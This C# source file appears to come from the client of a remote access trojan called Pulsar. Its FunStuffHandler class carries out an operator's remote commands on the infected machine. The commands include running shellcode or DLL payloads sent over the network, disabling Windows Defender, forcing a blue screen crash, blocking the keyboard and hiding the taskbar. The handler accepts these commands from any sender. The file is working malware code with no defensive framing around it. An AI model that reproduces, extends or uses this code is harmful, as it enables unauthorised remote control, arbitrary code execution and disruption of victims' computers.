using Pulsar.Common.Messages;
using Pulsar.Common.Networking;
using Pulsar.Common.Messages.FunStuff;
using Pulsar.Common.Messages.Other;
using Pulsar.Client.FunStuff;
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Diagnostics;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Pulsar.Client.Messages
{
    public class FunStuffHandler : IMessageProcessor, IDisposable
    {
        private BSOD _bsod = new BSOD();
        private SwapMouseButtons _swapMouseButtons = new SwapMouseButtons();
        private HideTaskbar _hideTaskbar = new HideTaskbar();
        private KeyboardInput _keyboardInput = new KeyboardInput();
        private CDTray _cdTray = new CDTray();
        private MonitorPower _monitorPower = new MonitorPower();
        private ShellcodeRunner _shellcodeRunner = new ShellcodeRunner();
        private DllRunner _dllRunner = new DllRunner(); // Added DLL runner
        private WindowsDefenderDisabler _windowsDefenderDisabler = new WindowsDefenderDisabler(); // Added
        public bool CanExecute(IMessage message) =>
            message is DoBSOD ||
            message is DoSwapMouseButtons ||
            message is DoHideTaskbar ||
            message is DoChangeWallpaper ||
            message is DoBlockKeyboardInput ||
            message is DoCDTray ||
            message is DoMonitorsOff ||
            message is DoSendBinFile ||
            message is DoDisableDefender; // Added

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoBSOD msg:
                    Execute(sender, msg);
                    break;
                case DoSwapMouseButtons msg:
                    Execute(sender, msg);
                    break;
                case DoHideTaskbar msg:
                    Execute(sender, msg);
                    break;
                case DoChangeWallpaper msg:
                    Execute(sender, msg);
                    break;
                case DoBlockKeyboardInput msg:
                    Execute(sender, msg);
                    break;
                case DoCDTray msg:
                    Execute(sender, msg);
                    break;
                case DoMonitorsOff msg:
                    Execute(sender, msg);
                    break;
                case DoSendBinFile msg:
                    Execute(sender, msg);
                    break;
                case DoDisableDefender msg: // Added
                    Execute(sender, msg);
                    break;
            }
        }
        private void Execute(ISender client, DoDisableDefender message)
        {
            try
            {
                _windowsDefenderDisabler.Handle(message, client);
            }
            catch (Exception ex)
            {
                client.Send(new SetStatus { Message = $"Failed to configure Windows Defender: {ex.Message}" });
            }
        }
        private void Execute(ISender client, DoSendBinFile message)
        {
            try
            {
                // Determine if this is shellcode or DLL based on message properties or content
                if (IsDllPayload(message))
                {
                    _dllRunner.Handle(message, client);
                }
                else
                {
                    _shellcodeRunner.Handle(message, client);
                }
            }
            catch (Exception ex)
            {
                client.Send(new SetStatus { Message = $"Failed to execute binary: {ex.Message}" });
            }
        }

        private bool IsDllPayload(DoSendBinFile message)
        {
            // You can implement logic here to determine if the payload is a DLL
            // Some possible approaches:

            // 1. Check file extension if available in message
            // if (!string.IsNullOrEmpty(message.FileName) && message.FileName.EndsWith(".dll", StringComparison.OrdinalIgnoreCase))
            //     return true;

            // 2. Check for DLL signature (MZ header)
            if (message.Data?.Length > 1 && message.Data[0] == 0x4D && message.Data[1] == 0x5A)
                return true;

            // 3. Add a property to DoSendBinFile message type to specify payload type
            // return message.PayloadType == "dll";

            // For now, default to shellcode execution
            return false;
        }

        private void Execute(ISender client, DoCDTray message)
        {
            try
            {
                _cdTray.Handle(message);
                client.Send(new SetStatus { Message = $"CD tray {(message.Open ? "opened" : "closed")} successfully" });
            }
            catch (Exception ex)
            {
                client.Send(new SetStatus { Message = $"Failed to {(message.Open ? "open" : "close")} CD tray: {ex.Message}" });
            }
        }

        private void Execute(ISender client, DoMonitorsOff message)
        {
            try
            {
                _monitorPower.Handle(message);
                client.Send(new SetStatus { Message = $"Monitors turned {(message.Off ? "off" : message.On ? "on" : "no action")} successfully" });
            }
            catch (Exception ex)
            {
                client.Send(new SetStatus { Message = $"Failed to change monitor state: {ex.Message}" });
            }
        }

        private void Execute(ISender client, DoBSOD message)
        {
            client.Send(new SetStatus { Message = "Successful BSOD" });
            _bsod.DOBSOD();
        }

        private void Execute(ISender client, DoSwapMouseButtons message)
        {
            try
            {
                SwapMouseButtons.SwapMouse();
                client.Send(new SetStatus { Message = "Successfull Mouse Swap" });
            }
            catch
            {
                client.Send(new SetStatus { Message = "Failed to swap mouse buttons" });
            }
        }

        private void Execute(ISender client, DoHideTaskbar message)
        {
            try
            {
                client.Send(new SetStatus { Message = "Successful Hide Taskbar" });
                HideTaskbar.DoHideTaskbar();
            }
            catch
            {
                client.Send(new SetStatus { Message = "Failed to hide taskbar" });
            }
        }

        private void Execute(ISender client, DoChangeWallpaper message)
        {
            try
            {
                string imagePath = SaveImageToFile(message.ImageData, message.ImageFormat);
                ChangeWallpaper.SetWallpaper(imagePath);
                client.Send(new SetStatus { Message = "Successful Wallpaper Change" });
            }
            catch
            {
                client.Send(new SetStatus { Message = "Failed to change wallpaper" });
            }
        }

        private void Execute(ISender client, DoBlockKeyboardInput message)
        {
            try
            {
                _keyboardInput.Handle(message);
                client.Send(new SetStatus { Message = $"Keyboard input {(message.Block ? "blocked" : "unblocked")} successfully" });
            }
            catch (Exception ex)
            {
                client.Send(new SetStatus { Message = $"Failed to {(message.Block ? "block" : "unblock")} keyboard input: {ex.Message}" });
            }
        }

        private string SaveImageToFile(byte[] imageData, string imageFormat)
        {
            string tempPath = Path.Combine(Path.GetTempPath(), "wallpaper" + GetImageExtension(imageFormat));
            using (MemoryStream ms = new MemoryStream(imageData))
            {
                Image image = Image.FromStream(ms);
                image.Save(tempPath, GetImageFormat(imageFormat));
            }
            return tempPath;
        }

        private string GetImageExtension(string imageFormat)
        {
            switch (imageFormat?.ToLower())
            {
                case "jpeg":
                case "jpg":
                    return ".jpg";
                case "png":
                    return ".png";
                case "bmp":
                    return ".bmp";
                case "gif":
                    return ".gif";
                default:
                    return ".img";
            }
        }

        private ImageFormat GetImageFormat(string imageFormat)
        {
            switch (imageFormat?.ToLower())
            {
                case "jpeg":
                case "jpg":
                    return ImageFormat.Jpeg;
                case "png":
                    return ImageFormat.Png;
                case "bmp":
                    return ImageFormat.Bmp;
                case "gif":
                    return ImageFormat.Gif;
                default:
                    throw new NotSupportedException($"Image format {imageFormat} is not supported.");
            }
        }

        #region IDisposable Implementation

        private bool _disposed = false;

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (!_disposed)
            {
                if (disposing)
                {
                    _keyboardInput?.Dispose();
                }
                _disposed = true;
            }
        }

        ~FunStuffHandler()
        {
            Dispose(false);
        }

        #endregion
    }
}